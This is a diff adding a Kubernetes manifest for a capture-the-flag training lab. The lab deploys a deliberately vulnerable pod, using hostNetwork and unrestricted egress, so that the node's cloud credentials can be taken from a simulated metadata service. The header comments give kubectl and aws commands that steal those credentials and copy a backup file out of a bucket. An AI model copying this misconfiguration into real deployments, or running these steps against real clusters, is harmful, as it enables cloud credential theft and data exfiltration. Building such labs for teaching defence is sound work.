@@ -1,0 +1,60 @@
+# K08 — Cluster-to-Cloud Lateral Movement (VULNERABLE)
+# NimbusMart's platform/data-exporter pod ships nightly reports. Someone gave it
+# hostNetwork "so it can talk to the metrics agent on the node" — dropping it
+# straight onto the node's network, right next to the cloud metadata service:
+#   - hostNetwork: true          -> shares the node's network, can reach IMDS
+#   - no egress restriction       -> nothing blocks the metadata endpoint
+#   - it ships the real `aws` CLI -> stolen node creds become cloud actions
+#
+# The AWS SDK/CLI auto-discovers credentials from IMDS. We point it at our fake
+# IMDS (stand-in for 169.254.169.254) and at the fake AWS account (LocalStack).
+#
+# Capture the flag — steal the node's cloud creds and exfil the backup bucket:
+#   kubectl exec -n platform data-exporter -- aws sts get-caller-identity
+#   kubectl exec -n platform data-exporter -- \
+#     aws s3 cp s3://nimbusmart-prod-backups/db-backup/credentials.txt -
+#
+# DO NOT run workloads with hostNetwork or unrestricted egress in production.
+apiVersion: v1
+kind: Namespace
+metadata:
+  name: platform
+  labels:
+    app.kubernetes.io/part-of: nimbusmart
+---
+apiVersion: v1
+kind: Pod
+metadata:
+  name: data-exporter
+  namespace: platform
+  labels:
+    app: data-exporter
+    owasp: k08
+spec:
+  # THE MISCONFIGURATION: the pod joins the node's network namespace, giving it a
+  # path to the node-level instance metadata service (169.254.169.254).
+  hostNetwork: true
+  dnsPolicy: ClusterFirstWithHostNet
+  containers:
+    - name: exporter
+      image: ctf-aws-cli:latest
+      imagePullPolicy: IfNotPresent
+      # Override the `aws` entrypoint with a shell; force S3 path-style so the
+      # CLI works against the LocalStack endpoint.
+      command: ["/bin/sh", "-c"]
+      args:
+        - "aws configure set default.s3.addressing_style path >/dev/null 2>&1 || true; exec sleep infinity"
+      env:
+        # The SDK's credential chain falls through to IMDS when no static keys
+        # are set — so it will lift the node's role creds from our fake IMDS.
+        # NOTE: trailing slash is required — botocore joins this with "latest/…"
+        # without inserting one, so a missing slash yields "…locallatest/…".
+        - name: AWS_EC2_METADATA_SERVICE_ENDPOINT
+          value: "http://imds.platform.svc.cluster.local/"
+        # All AWS calls go to the fake account (LocalStack).
+        - name: AWS_ENDPOINT_URL
+          value: "http://localstack.platform.svc.cluster.local:4566"
+        - name: AWS_DEFAULT_REGION
+          value: "us-east-1"
+        - name: AWS_REGION
+          value: "us-east-1"
